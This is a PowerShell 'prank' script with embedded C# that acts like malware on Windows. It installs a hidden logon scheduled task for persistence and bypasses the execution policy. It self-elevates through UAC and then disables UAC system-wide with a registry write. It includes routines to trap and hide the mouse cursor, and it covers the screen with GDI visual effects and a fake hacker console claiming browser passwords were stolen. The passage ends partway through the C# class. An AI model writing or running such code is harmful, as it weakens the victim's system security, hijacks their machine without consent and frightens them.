$TaskName = "MyStartupScript"
$ScriptPath = $MyInvocation.MyCommand.Path

# Delete old task if it exists
schtasks /Delete /TN $TaskName /F 2>$null

# Create the task using schtasks (COM-compatible)
schtasks /Create `
    /TN $TaskName `
    /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`"" `
    /SC ONLOGON `
    /RL LIMITED `
    /F


# --- Your script logic here ---
# Check if the script is running with administrator privileges
$IsAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $IsAdmin) {
    try {
        # Relaunch the script with elevated privileges
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        $psi.Verb = "runas"  # This triggers the UAC prompt
        [System.Diagnostics.Process]::Start($psi) | Out-Null
        exit  # Exit the current non-admin instance
    }
    catch {
        Write-Error "Administrator privileges are required to run this script."
        exit 1
    }
}

# --- Place your admin-required code below this line ---
Write-Host "Running with administrator privileges!" -ForegroundColor Green
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0

# 1. Force TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Add-Type -AssemblyName PresentationFramework, System.Speech, System.Windows.Forms, System.Drawing

# 2. Type Check & Native C# Compilation 
if (-not ("PrankV25" -as [type])) {
    $GdiCode = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Threading;
    using System.Drawing;
    using System.Collections.Generic;
    
    [StructLayout(LayoutKind.Sequential)] public struct POINT_V25 { public int x; public int y; }
    [StructLayout(LayoutKind.Sequential)] public struct RECT_V25 { public int left; public int top; public int right; public int bottom; }

    public class PhysObj {
        public int shapeType; 
        public bool isDisco;
        public float x, y;
        public float vx, vy;
        public float radius;
        public double rx, ry, rz; 
        public double rvX, rvY, rvZ; 
        public Color color;
    }

    public class PrankV25 {
        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("user32.dll")] public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
        [DllImport("user32.dll")] public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);
        [DllImport("user32.dll")] public static extern IntPtr CopyIcon(IntPtr hIcon);
        [DllImport("user32.dll")] public static extern bool SetSystemCursor(IntPtr hcur, uint id);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);
        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo", CharSet = CharSet.Auto)] public static extern bool SystemParametersInfoString(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
        [DllImport("user32.dll")] public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("user32.dll")] public static extern bool ClipCursor(ref RECT_V25 lpRect);
        [DllImport("user32.dll")] public static extern bool ClipCursor(IntPtr lpRect);
        [DllImport("user32.dll")] public static extern int ShowCursor(bool bShow);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")] public static extern bool DeleteDC(IntPtr hdc);
        [DllImport("user32.dll")] public static extern int FillRect(IntPtr hDC, ref RECT_V25 lprc, IntPtr hbr);
        [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);
        [DllImport("gdi32.dll")] public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);
        [DllImport("gdi32.dll")] public static extern bool PlgBlt(IntPtr hdcDest, POINT_V25[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);
        [DllImport("gdi32.dll")] public static extern bool Polygon(IntPtr hdc, POINT_V25[] lpPoints, int nCount);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll")] public static extern IntPtr CreatePen(int fnPenStyle, int nWidth, uint crColor);
        [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);
        [DllImport("gdi32.dll")] public static extern bool MoveToEx(IntPtr hdc, int X, int Y, IntPtr lpPoint);
        [DllImport("gdi32.dll")] public static extern bool LineTo(IntPtr hdc, int nXEnd, int nYEnd);

        static uint[] colors = { 0x000000FF, 0x000080FF, 0x0000FFFF, 0x0000FF00, 0x00FF0000, 0x0082004B, 0x00EE82EE };
        const uint SRCCOPY = 0x00CC0020;
        const uint DSTINVERT = 0x00550009;

        public static void DisableMouse() {
            RECT_V25 r = new RECT_V25 { left = 0, top = 0, right = 1, bottom = 1 };
            ClipCursor(ref r);
            while(ShowCursor(false) >= 0); 
        }
        
        public static void EnableMouse() {
            ClipCursor(IntPtr.Zero);
            while(ShowCursor(true) < 0); 
        }

        public static void RunSmoothRainbowHole(IntPtr hdc, int w, int h) {
            double angle = 0.0;
            uint PATCOPY = 0x00F00021;
            Random rand = new Random();
            int[] iconIds = { 32513, 32514, 32515, 32516 };
            
            for(int i = 0; i < 400; i++) {
                uint color = colors[i % colors.Length];
                IntPtr hBrush = CreateSolidBrush(color);
                IntPtr hOldBrush = SelectObject(hdc, hBrush);

                angle += 0.05; 
                POINT_V25[] pts = new POINT_V25[3];
                int newW = w - 40; int newH = h - 40;
                double cx = w / 2.0; double cy = h / 2.0;
                double hw = newW / 2.0; double hh = newH / 2.0;
                double cosA = Math.Cos(angle); double sinA = Math.Sin(angle);

                pts[0].x = (int)(cx + (-hw * cosA - -hh * sinA)); pts[0].y = (int)(cy + (-hw * sinA + -hh * cosA));
                pts[1].x = (int)(cx + (hw * cosA - -hh * sinA));  pts[1].y = (int)(cy + (hw * sinA + -hh * cosA));
                pts[2].x = (int)(cx + (-hw * cosA - hh * sinA));  pts[2].y = (int)(cy + (-hw * sinA + hh * cosA));

                PlgBlt(hdc, pts, hdc, 0, 0, w, h, IntPtr.Zero, 0, 0);
                PatBlt(hdc, 0, 0, w, 20, PATCOPY); PatBlt(hdc, 0, h - 20, w, 20, PATCOPY);
                PatBlt(hdc, 0, 0, 20, h, PATCOPY); PatBlt(hdc, w - 20, 0, 20, h, PATCOPY);

                DrawIcon(hdc, rand.Next(w), rand.Next(h), LoadIcon(IntPtr.Zero, iconIds[rand.Next(4)]));
                DrawIcon(hdc, rand.Next(w), rand.Next(h), LoadIcon(IntPtr.Zero, iconIds[rand.Next(4)]));

                SelectObject(hdc, hOldBrush); DeleteObject(hBrush);
                Thread.Sleep(15); 
            }
        }

        // --- THE FIX: Fully Patched Multi-Mesh Generator ---
        private static void GetMeshes(out double[] cV, out int[] cF, out double[] sV, out int[] sF, out double[] pV, out int[] pF, out double[] tV, out int[] tF, out int sphR, out int sphS, out int torR, out int torS) {
            // 1. CUBE
            cV = new double[]{ -1,-1,-1, 1,-1,-1, 1,1,-1, -1,1,-1, -1,-1,1, 1,-1,1, 1,1,1, -1,1,1 };
            cF = new int[]{ 0,1,2,3, 4,5,6,7, 3,2,6,7, 0,1,5,4, 0,3,7,4, 1,2,6,5 };

            // 2. SPHERE
            sphR = 12; sphS = 12;
            sV = new double[sphR * sphS * 3];
            sF = new int[(sphR-1) * sphS * 4];
            int vIdx = 0;
            for(int r=0; r<sphR; r++) {
                double phi = Math.PI * (double)r / (sphR - 1);
                for(int s=0; s<sphS; s++) {
                    double theta = 2.0 * Math.PI * (double)s / sphS;
                    sV[vIdx++] = Math.Sin(phi) * Math.Cos(theta);
                    sV[vIdx++] = Math.Sin(phi) * Math.Sin(theta);
                    sV[vIdx++] = Math.Cos(phi);
                }
            }
            int fIdx = 0;
            for(int r=0; r<sphR-1; r++) {
                for(int s=0; s<sphS; s++) {
                    sF[fIdx++] = r * sphS + s;
                    sF[fIdx++] = r * sphS + ((s + 1) % sphS);
                    sF[fIdx++] = ((r + 1) % sphR) * sphS + ((s + 1) % sphS);
                    sF[fIdx++] = ((r + 1) % sphR) * sphS + s;
                }
            }

            // 3. PYRAMID
            pV = new double[] { 0, 1.5, 0, -1, -1, -1, 1, -1, -1, 1, -1, 1, -1, -1, 1 };
            pF = new int[] { 0, 1, 2, 2, 0, 2, 3, 3, 0, 3, 4, 4, 0, 4, 1, 1, 4, 3, 2, 1 };

            // 4. DONUT
            torR = 12; torS = 12;
            tV = new double[torR * torS * 3];
            tF = new int[torR * torS * 4];
            double R = 1.5; double rad = 0.6; vIdx = 0;
            for(int i = 0; i < torR; i++) {
                double theta = i * 2.0 * Math.PI / torR;
                for(int j = 0; j < torS; j++) {
                    double phi = j * 2.0 * Math.PI / torS;
                    tV[vIdx++] = (R + rad * Math.Cos(phi)) * Math.Cos(theta); 
                    tV[vIdx++] = rad * Math.Sin(phi);                         
                    tV[vIdx++] = (R + rad * Math.Cos(phi)) * Math.Sin(theta); 
                }
            }
            fIdx = 0;
            for(int ring = 0; ring < torR; ring++) {
                for(int sect = 0; sect < torS; sect++) {
                    tF[fIdx++] = ring * torS + sect;
                    tF[fIdx++] = ring * torS + ((sect + 1) % torS);
                    tF[fIdx++] = ((ring + 1) % torR) * torS + ((sect + 1) % torS);
                    tF[fIdx++] = ((ring + 1) % torR) * torS + sect;
                }
            }
        }

        // STAGE 13: Central 3D Shape Shifter
        public static void Run3DShapeEngine(IntPtr hdc, int w, int h) {
            IntPtr hdcMem = CreateCompatibleDC(hdc);
            IntPtr hbmMem = CreateCompatibleBitmap(hdc, w, h);
            IntPtr hOldSel = SelectObject(hdcMem, hbmMem);
            RECT_V25 screenRect = new RECT_V25 { left = 0, top = 0, right = w, bottom = h };

            double[] cV, sV, pV, tV; int[] cF, sF, pF, tF; int sphR, sphS, torR, torS;
            GetMeshes(out cV, out cF, out sV, out sF, out pV, out pF, out tV, out tF, out sphR, out sphS, out torR, out torS);

            double rotX = 0, rotY = 0, rotZ = 0;
            long startTick = Environment.TickCount;
            int loopCount = 0;

            while(true) {
                long elapsed = Environment.TickCount - startTick;
                if (elapsed > 20000) break; 

                int shapePhase = (int)(elapsed / 5000) % 4; 
                bool isSolid = ((elapsed / 2500) % 2 == 1);

                double[] activeV; int[] activeF; int vCount, fCount;
                
                if (shapePhase == 0)      { activeV = cV; activeF = cF; vCount = 8; fCount = 6; }
                else if (shapePhase == 1) { activeV = sV; activeF = sF; vCount = sphR * sphS; fCount = (sphR - 1) * sphS; }
                else if (shapePhase == 2) { activeV = pV; activeF = pF; vCount = 5; fCount = 5; }
                else                      { activeV = tV; activeF = tF; vCount = torR * torS; fCount = torR * torS; }

                uint bgCol = colors[(loopCount / 20) % colors.Length];
                IntPtr hBgBrush = CreateSolidBrush(bgCol);
                FillRect(hdcMem, ref screenRect, hBgBrush);
                DeleteObject(hBgBrush);

                rotX += 0.0142; rotY += 0.019; rotZ += 0.0095;
                
                POINT_V25[] pts = new POINT_V25[vCount];
                double[] transZ = new double[vCount]; 
                double cameraZ = 8.0; 
                double scale = (shapePhase == 1 || shapePhase == 3) ? 1800.0 : 2500.0;

                for(int i=0; i<vCount; i++) {
                    double x = activeV[i*3], y = activeV[i*3+1], z = activeV[i*3+2];
                    double xy = Math.Cos(rotX)*y - Math.Sin(rotX)*z, xz = Math.Sin(rotX)*y + Math.Cos(rotX)*z; y = xy; z = xz;
                    double yx = Math.Cos(rotY)*x + Math.Sin(rotY)*z, yz = -Math.Sin(rotY)*x + Math.Cos(rotY)*z; x = yx; z = yz;
                    double zx = Math.Cos(rotZ)*x - Math.Sin(rotZ)*y, zy = Math.Sin(rotZ)*x + Math.Cos(rotZ)*y; x = zx; y = zy;

                    pts[i].x = (int)((x / (z + cameraZ)) * scale + w/2);
                    pts[i].y = (int)((y / (z + cameraZ)) * scale + h/2);
                    transZ[i] = z; 
                }

                int[] faceOrder = new int[fCount];
                double[] faceZ = new double[fCount];
                for(int i=0; i<fCount; i++) {
                    faceOrder[i] = i;
                    int fOff = i*4;
                    faceZ[i] = transZ[activeF[fOff]] + transZ[activeF[fOff+1]] + transZ[activeF[fOff+2]] + transZ[activeF[fOff+3]];
                }

                for (int i = 1; i < fCount; i++) {
                    int key = faceOrder[i]; double keyZ = faceZ[key]; int j = i - 1;
                    while (j >= 0 && faceZ[faceOrder[j]] < keyZ) { faceOrder[j + 1] = faceOrder[j]; j = j - 1; }
                    faceOrder[j + 1] = key;
                }

                if (!isSolid) {
                    uint penCol = colors[(loopCount / 20 + 3) % colors.Length]; 
                    IntPtr hPen = CreatePen(0, 5, penCol); 
                    IntPtr hOldPen = SelectObject(hdcMem, hPen);
                    for(int i=0; i<fCount; i++) { 
                        int fOff = faceOrder[i] * 4;
                        MoveToEx(hdcMem, pts[activeF[fOff]].x, pts[activeF[fOff]].y, IntPtr.Zero); 
                        LineTo(hdcMem, pts[activeF[fOff+1]].x, pts[activeF[fOff+1]].y); 
                        LineTo(hdcMem, pts[activeF[fOff+2]].x, pts[activeF[fOff+2]].y); 
                        LineTo(hdcMem, pts[activeF[fOff+3]].x, pts[activeF[fOff+3]].y); 
                        LineTo(hdcMem, pts[activeF[fOff]].x, pts[activeF[fOff]].y); 
                    }
                    SelectObject(hdcMem, hOldPen); DeleteObject(hPen);
                } else {
                    for(int i=0; i<fCount; i++) {
                        int faceIdx = faceOrder[i];
                        int fOff = faceIdx * 4;
                        POINT_V25[] polyPts = new POINT_V25[4];
                        polyPts[0] = pts[activeF[fOff]]; polyPts[1] = pts[activeF[fOff+1]];
                        polyPts[2] = pts[activeF[fOff+2]]; polyPts[3] = pts[activeF[fOff+3]];

                        uint faceColor = colors[(faceIdx + (shapePhase > 0 ? loopCount/10 : 0)) % colors.Length];
                        IntPtr hFBrush = CreateSolidBrush(faceColor);
                        IntPtr hOldBrush = SelectObject(hdcMem, hFBrush);
                        IntPtr hPen = CreatePen(0, 2, 0x00000000); 
                        IntPtr hOldPen = SelectObject(hdcMem, hPen);

                        Polygon(hdcMem, polyPts, 4);

                        SelectObject(hdcMem, hOldPen); DeleteObject(hPen);
                        SelectObject(hdcMem, hOldBrush); DeleteObject(hFBrush);
                    }
                }
                
                BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
                Thread.Sleep(5); loopCount++;
            }
            SelectObject(hdcMem, hOldSel); DeleteObject(hbmMem); DeleteDC(hdcMem);
        }

        // STAGE 14: Orbiting Virtual Windows
        public static void RunOrbitingWindows(IntPtr hdc, int w, int h) {
            IntPtr hdcMem = CreateCompatibleDC(hdc);
            IntPtr hbmMem = CreateCompatibleBitmap(hdc, w, h);
            IntPtr hOldSel = SelectObject(hdcMem, hbmMem);
            RECT_V25 screenRect = new RECT_V25 { left = 0, top = 0, right = w, bottom = h };

            double[] cV, sV, pV, tV; int[] cF, sF, pF, tF; int sphR, sphS, torR, torS;
            GetMeshes(out cV, out cF, out sV, out sF, out pV, out pF, out tV, out tF, out sphR, out sphS, out torR, out torS);

            int MAX_WINS = 4;
            int[] shapes = new int[]{ 0, 1, 2, 3 }; 
            bool[] active = new bool[MAX_WINS];
            double[] rotX = new double[MAX_WINS];
            double[] rotY = new double[MAX_WINS];
            double[] rotZ = new double[MAX_WINS];
            
            double globalRadius = h * 0.40; 
            double baseWinSize = h * 0.35;  

            long startTick = Environment.TickCount;
            int loopCount = 0;

            while(true) {
                long elapsed = Environment.TickCount - startTick;
                if (elapsed > 23000) break;

                bool sucking = elapsed > 20000;
                double currentAngle = (elapsed * 0.0015);

                if (sucking) {
                    globalRadius = Math.Max(0, globalRadius * 0.95); 
                    baseWinSize = Math.Max(0, baseWinSize * 0.92);   
                    currentAngle = (elapsed * 0.004);
                }

                uint bgCol = colors[(loopCount / 20) % colors.Length];
                IntPtr hBgBrush = CreateSolidBrush(bgCol);
                FillRect(hdcMem, ref screenRect, hBgBrush);
                DeleteObject(hBgBrush);

                for (int i=0; i<MAX_WINS; i++) {
                    if (elapsed > i * 4000) active[i] = true; 
                    if (!active[i]) continue;

                    rotX[i] += 0.03; rotY[i] += 0.04; rotZ[i] += 0.02;

                    double myAngle = currentAngle + (i * Math.PI * 2 / MAX_WINS);
                    double cx = w/2 + Math.Cos(myAngle) * globalRadius;
                    double cy = h/2 + Math.Sin(myAngle) * globalRadius;

                    if (baseWinSize < 5) continue; 

                    RECT_V25 winRect = new RECT_V25 { 
                        left = (int)(cx - baseWinSize/2), top = (int)(cy - baseWinSize/2), right = (int)(cx + baseWinSize/2), bottom = (int)(cy + baseWinSize/2) 
                    };
                    IntPtr hBlkBrush = CreateSolidBrush(0x00000000); 
                    FillRect(hdcMem, ref winRect, hBlkBrush);
                    DeleteObject(hBlkBrush);

                    IntPtr hWhtPen = CreatePen(0, 4, 0x00FFFFFF);
                    IntPtr hOldPen2 = SelectObject(hdcMem, hWhtPen);
                    MoveToEx(hdcMem, winRect.left, winRect.top, IntPtr.Zero);
                    LineTo(hdcMem, winRect.right, winRect.top); LineTo(hdcMem, winRect.right, winRect.bottom);
                    LineTo(hdcMem, winRect.left, winRect.bottom); LineTo(hdcMem, winRect.left, winRect.top);
                    SelectObject(hdcMem, hOldPen2); DeleteObject(hWhtPen);

                    double[] activeV; int[] activeF; int vCount, fCount;
                    
                    if (shapes[i] == 0)      { activeV = cV; activeF = cF; vCount = 8; fCount = 6; }
                    else if (shapes[i] == 1) { activeV = sV; activeF = sF; vCount = sphR * sphS; fCount = (sphR - 1) * sphS; }
                    else if (shapes[i] == 2) { activeV = pV; activeF = pF; vCount = 5; fCount = 5; }
                    else                     { activeV = tV; activeF = tF; vCount = torR * torS; fCount = torR * torS; }

                    POINT_V25[] pts = new POINT_V25[vCount];
                    double[] transZ = new double[vCount]; 
                    double cameraZ = 8.0; 
                    double scale = baseWinSize * 2.2; 

                    for(int v=0; v<vCount; v++) {
                        double x = activeV[v*3], y = activeV[v*3+1], z = activeV[v*3+2];
                        double xy = Math.Cos(rotX[i])*y - Math.Sin(rotX[i])*z, xz = Math.Sin(rotX[i])*y + Math.Cos(rotX[i])*z; y = xy; z = xz;
                        double yx = Math.Cos(rotY[i])*x + Math.Sin(rotY[i])*z, yz = -Math.Sin(rotY[i])*x + Math.Cos(rotY[i])*z; x = yx; z = yz;
                        double zx = Math.Cos(rotZ[i])*x - Math.Sin(rotZ[i])*y, zy = Math.Sin(rotZ[i])*x + Math.Cos(rotZ[i])*y; x = zx; y = zy;

                        pts[v].x = (int)((x / (z + cameraZ)) * scale + cx);
                        pts[v].y = (int)((y / (z + cameraZ)) * scale + cy);
                        transZ[v] = z; 
                    }

                    int[] faceOrder = new int[fCount];
                    double[] faceZ = new double[fCount];
                    for(int f=0; f<fCount; f++) {
                        faceOrder[f] = f;
                        int fOff = f*4;
                        faceZ[f] = transZ[activeF[fOff]] + transZ[activeF[fOff+1]] + transZ[activeF[fOff+2]] + transZ[activeF[fOff+3]];
                    }

                    for (int f = 1; f < fCount; f++) {
                        int key = faceOrder[f]; double keyZ = faceZ[key]; int j = f - 1;
                        while (j >= 0 && faceZ[faceOrder[j]] < keyZ) { faceOrder[j + 1] = faceOrder[j]; j = j - 1; }
                        faceOrder[j + 1] = key;
                    }

                    for(int f=0; f<fCount; f++) {
                        int faceIdx = faceOrder[f];
                        int fOff = faceIdx * 4;
                        POINT_V25[] polyPts = new POINT_V25[4];
                        polyPts[0] = pts[activeF[fOff]]; polyPts[1] = pts[activeF[fOff+1]];
                        polyPts[2] = pts[activeF[fOff+2]]; polyPts[3] = pts[activeF[fOff+3]];

                        uint faceColor = colors[(faceIdx + loopCount/5) % colors.Length];
                        IntPtr hFBrush = CreateSolidBrush(faceColor);
                        IntPtr hOldBrush = SelectObject(hdcMem, hFBrush);
                        IntPtr hPen = CreatePen(0, 1, 0x00000000); 
                        IntPtr hOldPen = SelectObject(hdcMem, hPen);
                        Polygon(hdcMem, polyPts, 4);
                        SelectObject(hdcMem, hOldPen); DeleteObject(hPen);
                        SelectObject(hdcMem, hOldBrush); DeleteObject(hFBrush);
                    }
                }
                BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
                Thread.Sleep(10); loopCount++;
            }
            SelectObject(hdcMem, hOldSel); DeleteObject(hbmMem); DeleteDC(hdcMem);
        }

        // ACT 3: FULLSCREEN 2.5D PHYSICS SANDBOX
        public static void RunPhysicsSandbox(IntPtr hdc, int w, int h) {
            IntPtr hdcMem = CreateCompatibleDC(hdc);
            IntPtr hbmMem = CreateCompatibleBitmap(hdc, w, h);
            IntPtr hOldSel = SelectObject(hdcMem, hbmMem);

            double[] cV, sV, pV, tV; int[] cF, sF, pF, tF; int sphR, sphS, torR, torS;
            GetMeshes(out cV, out cF, out sV, out sF, out pV, out pF, out tV, out tF, out sphR, out sphS, out torR, out torS);

            List<PhysObj> shapes = new List<PhysObj>();
            Random rand = new Random();
            long startTick = Environment.TickCount;
            int frames = 0;

            while(true) {
                long elapsed = Environment.TickCount - startTick;
                if (elapsed > 20000) break; 

                if (frames % 8 == 0 && shapes.Count < 60) {
                    shapes.Add(new PhysObj {
                        shapeType = rand.Next(4),
                        isDisco = rand.Next(100) < 20, 
                        x = rand.Next(100, w - 100), y = 50,
                        vx = (float)(rand.NextDouble() * 14 - 7), vy = (float)(rand.NextDouble() * 5),
                        radius = 45f, 
                        rx = rand.NextDouble(), ry = rand.NextDouble(), rz = rand.NextDouble(),
                        rvX = rand.NextDouble()*0.1, rvY = rand.NextDouble()*0.1, rvZ = rand.NextDouble()*0.1,
                        color = Color.FromArgb((int)colors[rand.Next(colors.Length)])
                    });
                }

                RECT_V25 fillR = new RECT_V25 { left = 0, top = 0, right = w, bottom = h };
                IntPtr hBgBrush = CreateSolidBrush(0x00000000);
                FillRect(hdcMem, ref fillR, hBgBrush);
                DeleteObject(hBgBrush);

                for (int i = 0; i < shapes.Count; i++) {
                    var s = shapes[i];

                    if (s.isDisco) s.color = Color.FromArgb((int)colors[(frames / 2) % colors.Length]);

                    s.vy += 0.8f; 
                    s.x += s.vx; s.y += s.vy;
                    s.vx *= 0.99f; s.vy *= 0.99f;

                    if (s.x - s.radius < 0) { s.x = s.radius; s.vx *= -0.7f; }
                    if (s.x + s.radius > w) { s.x = w - s.radius; s.vx *= -0.7f; }
                    if (s.y - s.radius < 0) { s.y = s.radius; s.vy *= -0.7f; }
                    if (s.y + s.radius > h) { s.y = h - s.radius; s.vy *= -0.6f; s.vx *= 0.95f; }

                    for(int j = i + 1; j < shapes.Count; j++) {
                        var s2 = shapes[j];
                        float dx = s2.x - s.x; float dy = s2.y - s.y;
                        float dist = (float)Math.Sqrt(dx*dx + dy*dy);
                        float minDist = s.radius + s2.radius;
                        
                        if (dist < minDist) {
                            float overlap = minDist - dist;
                            float nx = dx / dist; float ny = dy / dist;
                            s.x -= nx * overlap / 2; s.y -= ny * overlap / 2;
                            s2.x += nx * overlap / 2; s2.y += ny * overlap / 2;

                            float p = 2 * (s.vx * nx + s.vy * ny - s2.vx * nx - s2.vy * ny) / 2;
                            s.vx -= p * nx * 0.8f; s.vy -= p * ny * 0.8f;
                            s2.vx += p * nx * 0.8f; s2.vy += p * ny * 0.8f;
                        }
                    }

                    s.rx += s.rvX; s.ry += s.rvY; s.rz += s.rvZ;
                    
                    double[] activeV; int[] activeF; int vCount, fCount;
                    
                    if (s.shapeType == 0)      { activeV = cV; activeF = cF; vCount = 8; fCount = 6; }
                    else if (s.shapeType == 1) { activeV = sV; activeF = sF; vCount = sphR * sphS; fCount = (sphR - 1) * sphS; }
                    else if (s.shapeType == 2) { activeV = pV; activeF = pF; vCount = 5; fCount = 5; }
                    else                       { activeV = tV; activeF = tF; vCount = torR * torS; fCount = torR * torS; }

                    POINT_V25[] pts = new POINT_V25[vCount];
                    double[] transZ = new double[vCount]; 
                    double cameraZ = 5.0; 
                    double scale = (s.shapeType == 1 || s.shapeType == 3) ? 18.0 : 25.0; 

                    for(int v=0; v<vCount; v++) {
                        double x = activeV[v*3], y = activeV[v*3+1], z = activeV[v*3+2];
                        double xy = Math.Cos(s.rx)*y - Math.Sin(s.rx)*z, xz = Math.Sin(s.rx)*y + Math.Cos(s.rx)*z; y = xy; z = xz;
                        double yx = Math.Cos(s.ry)*x + Math.Sin(s.ry)*z, yz = -Math.Sin(s.ry)*x + Math.Cos(s.ry)*z; x = yx; z = yz;
                        double zx = Math.Cos(s.rz)*x - Math.Sin(s.rz)*y, zy = Math.Sin(s.rz)*x + Math.Cos(s.rz)*y; x = zx; y = zy;

                        pts[v].x = (int)((x / (z + cameraZ)) * scale * (cameraZ) + s.x);
                        pts[v].y = (int)((y / (z + cameraZ)) * scale * (cameraZ) + s.y);
                        transZ[v] = z; 
                    }

                    int[] faceOrder = new int[fCount];
                    double[] faceZ = new double[fCount];
                    for(int f=0; f<fCount; f++) {
                        faceOrder[f] = f;
                        int fOff = f*4;
                        faceZ[f] = transZ[activeF[fOff]] + transZ[activeF[fOff+1]] + transZ[activeF[fOff+2]] + transZ[activeF[fOff+3]];
                    }

                    for (int f = 1; f < fCount; f++) {
                        int key = faceOrder[f]; double keyZ = faceZ[key]; int j = f - 1;
                        while (j >= 0 && faceZ[faceOrder[j]] < keyZ) { faceOrder[j + 1] = faceOrder[j]; j = j - 1; }
                        faceOrder[j + 1] = key;
                    }

                    for(int f=0; f<fCount; f++) {
                        int faceIdx = faceOrder[f];
                        int fOff = faceIdx * 4;
                        POINT_V25[] polyPts = new POINT_V25[4];
                        polyPts[0] = pts[activeF[fOff]]; polyPts[1] = pts[activeF[fOff+1]];
                        polyPts[2] = pts[activeF[fOff+2]]; polyPts[3] = pts[activeF[fOff+3]];

                        IntPtr hFBrush = CreateSolidBrush((uint)s.color.ToArgb());
                        IntPtr hOldBrush = SelectObject(hdcMem, hFBrush);
                        IntPtr hPen = CreatePen(0, 1, 0x00000000); 
                        IntPtr hOldPen = SelectObject(hdcMem, hPen);

                        Polygon(hdcMem, polyPts, 4);

                        SelectObject(hdcMem, hOldPen); DeleteObject(hPen);
                        SelectObject(hdcMem, hOldBrush); DeleteObject(hFBrush);
                    }
                }
                
                BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
                Thread.Sleep(10); 
                frames++;
            }
            SelectObject(hdcMem, hOldSel); DeleteObject(hbmMem); DeleteDC(hdcMem);
        }

        // ACT 4: THE MELTDOWN STAGES
        public static void RunFakeHackerCMD(IntPtr hdc, int w, int h) {
            IntPtr hdcMem = CreateCompatibleDC(hdc);
            IntPtr hbmMem = CreateCompatibleBitmap(hdc, w, h);
            IntPtr hOldSel = SelectObject(hdcMem, hbmMem);

            string[] lines = new string[] {
                "C:\\> execute payload.exe --root",
                "[*] Initializing secure connection...",
                "[*] Bypassing Windows Defender...",
                "[+] Exploit successful. Firewall neutralized.",
                "[*] Elevating privileges to SYSTEM...",
                "[+] ADMIN ACCESS GRANTED.",
                "[*] Activating Windows 12 (Leaked internal build)...",
                "[+] Windows 12 Registered.",
                "[*] Injecting rootkit into explorer.exe...",
                "[*] Deleting System32... (Just kidding)",
                "[*] Downloading more RAM... 100% Complete.",
                "[*] Extracting saved browser passwords...",
                "[+] 42 passwords found and uploaded to remote server.",
                "[*] Re-routing mainframe quantum relays...",
                "[!] WARNING: FBI tracked connection.",
                "[*] Erasing event logs...",
                "[+] Traces deleted successfully.",
                "C:\\> exit"
            };

            int currentLine = 0;
            long startTick = Environment.TickCount;
            
            while (true) {
                long elapsed = Environment.TickCount - startTick;
                if (elapsed > 10000) break;

                currentLine = (int)(elapsed / 400); 
                if (currentLine > lines.Length) currentLine = lines.Length;

                using (Graphics g = Graphics.FromHdc(hdcMem)) {
                    g.Clear(Color.Black);

                    int cmdW = 800; int cmdH = 500;
                    int cmdX = (w - cmdW) / 2; int cmdY = (h - cmdH) / 2;

                    g.FillRectangle(Brushes.Black, cmdX, cmdY, cmdW, cmdH);
                    g.FillRectangle(Brushes.White, cmdX, cmdY, cmdW, 30);
                    g.DrawRectangle(Pens.Gray, cmdX, cmdY, cmdW, cmdH);

                    using (Font titleFont = new Font("Consolas", 12, FontStyle.Bold)) {
                        g.DrawString("C:\\Windows\\System32\\cmd.exe", titleFont, Brushes.Black, cmdX + 10, cmdY + 5);
                    }

                    using (Font cmdFont = new Font("Consolas", 12)) {
                        int yOffset = cmdY + 40;
                        int startIdx = Math.Max(0, currentLine - 18); 
                        for (int i = startIdx; i < currentLine; i++) {
                            g.DrawString(lines[i], cmdFont, Brushes.LimeGreen, cmdX + 10, yOffset);
                            yOffset += 20;
                        }
                        if ((elapsed / 300) % 2 == 0 && currentLine < lines.Length) {
                            g.DrawString("_", cmdFont, Brushes.LimeGreen, cmdX + 10, yOffset);
                        }
                    }
                }
                BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
                Thread.Sleep(50);
            }
            SelectObject(hdcMem, hOldSel); DeleteObject(hbmMem); DeleteDC(hdcMem);
        }

